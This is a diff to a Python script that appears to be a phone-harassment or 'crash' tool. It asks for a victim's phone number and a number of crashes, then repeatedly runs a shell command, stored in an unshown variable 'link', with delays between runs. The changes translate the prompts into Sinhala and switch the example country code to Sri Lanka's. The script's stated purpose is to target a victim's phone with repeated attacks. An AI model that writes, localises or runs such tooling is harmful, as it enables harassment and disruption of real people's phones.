@@ -59,14 +59,14 @@ def main():
 	os.system('clear')
 	print(logo)
 	print()
-	cncode=int(input(f'{G}[{Y}+{G}]{M} Enter Country Code WithOut "+" eg.91 {C}=> '))
+	cncode=int(input(f'{G}[{Y}+{G}]{M} Enter Country Code WithOut "+" eg.94 {C}=> '))
 	print()
 	num=input(f"{G}[{Y}+{G}]{M} Enter the Victim's Phone number\n\n{C}=> {cncode}  ")
 	print()
-	crash=int(input(f'{G}[{Y}+{G}]{M} Enter the number of crashes {W}(Max 15 per 30min) \n\n{C}=> '))
+	crash=int(input(f'{G}[{Y}+{G}]{M} Crash කිරීමට අවශ්‍ය අංකය ගහන්න {W}(Max 15 per 30min) \n\n{C}=> '))
 	combnum = f"+{cncode}{num}"
 	print()
-	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
+	Finalcall=input(f'{G}[?]{W} ඔබට දුරකතන අංකය වෙනස් කිරීමට අවශ්‍යද.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
 	if Finalcall == 'Y'  or Finalcall == 'y':
 		main()
 	elif Finalcall == 'N' or Finalcall == 'n':
@@ -77,24 +77,24 @@ def main():
 """)
 	for i in range (crash):
 		print()
-		print(f"{Y}[✓] Sending Now\n")
+		print(f"{Y}[✓] යවමින් පවති\n")
 		print(f"{G}[{Y}+{G}]{M}Applying 40sec delay...")
 		link1 = os.system(link)
 		time.sleep(40)
 		if link1 == 0:
-			print(f"{G} Successful")
+			print(f"{G} සාර්තකයි")
 			pass
 		else:
-			print(f"{R}[×] Failed  ")
+			print(f"{R}[×] අසාර්තකයි  ")
 		time.sleep(0.2)
 	return main()
 
 def MSG():
 	print(Y)
-	YTC = input("Have U Join Us ? (Y/N): ")
+	YTC = input("ඔබ අපිත්තෙක්ක සම්බන්ද වුනාද ? (Y/N): ")
 	if YTC == 'Y' or YTC == 'y':
 		print(G)
-		print("Thank You For Joining Us...\n")
+		print("ඉස්තූති අපිත්තෙක්ක සම්බන්ද වුන එකට...\n")
 		time.sleep(4)
 		print("Initializing tool...")
 		time.sleep(4)		
